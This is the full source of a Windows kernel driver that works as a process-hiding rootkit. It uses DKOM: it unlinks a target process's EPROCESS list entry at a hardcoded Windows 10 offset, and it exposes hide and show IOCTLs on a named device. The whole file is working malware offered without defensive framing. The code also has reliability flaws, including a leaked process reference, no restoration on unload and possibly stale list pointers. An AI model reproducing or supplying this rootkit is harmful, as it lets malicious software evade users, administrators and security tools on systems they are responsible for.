#include <ntddk.h>
#include <ntstrsafe.h>

#define IOCTL_HIDE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define IOCTL_SHOW_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)

#define OFFSET_ActiveProcessLinks 0x448 //Windows 10x64 19045 22H2

typedef struct _HIDDEN_ENTRY {
    HANDLE Pid;
    LIST_ENTRY* Flink;
    LIST_ENTRY* Blink;
    LIST_ENTRY* Links;
    struct _HIDDEN_ENTRY* Next;
} HIDDEN_ENTRY;

PDEVICE_OBJECT DeviceObject = NULL;
HIDDEN_ENTRY* HiddenListHead = NULL;
UNICODE_STRING SymLink = RTL_CONSTANT_STRING(L"\\??\\HideProcess_LINK");

extern "C" NTSTATUS PsLookupProcessByProcessId(
    HANDLE    ProcessId,
    PEPROCESS* Process
);

NTSTATUS GetProcessLinksByPid(HANDLE pid, LIST_ENTRY** outLinks) {
    PEPROCESS target = NULL;

    if (!NT_SUCCESS(PsLookupProcessByProcessId(pid, &target)))
        return STATUS_NOT_FOUND;

    *outLinks = (LIST_ENTRY*)((PUCHAR)target + 0x448);
    return STATUS_SUCCESS;
}

VOID DestroyLinks(HANDLE pid) {
    LIST_ENTRY* links = NULL;

    if (!NT_SUCCESS(GetProcessLinksByPid(pid, &links)))
        return;

    HIDDEN_ENTRY* entry = (HIDDEN_ENTRY*)ExAllocatePoolWithTag(NonPagedPool, sizeof(HIDDEN_ENTRY), 'hPID');
    if (!entry)
        return;

    entry->Pid = pid;
    entry->Flink = links->Flink;
    entry->Blink = links->Blink;
    entry->Links = links;

    links->Blink->Flink = links->Flink;
    links->Flink->Blink = links->Blink;

    links->Flink = links;
    links->Blink = links;

    entry->Next = HiddenListHead;
    HiddenListHead = entry;
}

VOID RestoreLinks(HANDLE pid) {
    HIDDEN_ENTRY* prev = NULL;
    HIDDEN_ENTRY* curr = HiddenListHead;

    while (curr) {
        if (curr->Pid == pid) {
            curr->Links->Flink = curr->Flink;
            curr->Links->Blink = curr->Blink;
            curr->Blink->Flink = curr->Links;
            curr->Flink->Blink = curr->Links;

            if (prev)
                prev->Next = curr->Next;
            else
                HiddenListHead = curr->Next;

            ExFreePoolWithTag(curr, 'hPID');
            return;
        }

        prev = curr;
        curr = curr->Next;
    }
}

NTSTATUS DispatchIoctl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    ULONG ctlCode = stack->Parameters.DeviceIoControl.IoControlCode;

    if (ctlCode == IOCTL_HIDE_PROCESS && stack->Parameters.DeviceIoControl.InputBufferLength == sizeof(ULONG)) {
        ULONG pid = *(ULONG*)Irp->AssociatedIrp.SystemBuffer;
        DestroyLinks((HANDLE)(ULONG_PTR)pid);
    }
    else if (ctlCode == IOCTL_SHOW_PROCESS && stack->Parameters.DeviceIoControl.InputBufferLength == sizeof(ULONG)) {
        ULONG pid = *(ULONG*)Irp->AssociatedIrp.SystemBuffer;
        RestoreLinks((HANDLE)(ULONG_PTR)pid);
    }

    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS DriverCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
    IoDeleteSymbolicLink(&SymLink);
    IoDeleteDevice(DeviceObject);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);

    UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\HideProcess_ACCESS");

    DriverObject->DriverUnload = DriverUnload;
    DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = DriverCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchIoctl;

    if (!NT_SUCCESS(IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject)))
        return STATUS_UNSUCCESSFUL;

    IoCreateSymbolicLink(&SymLink, &devName);

    return STATUS_SUCCESS;
}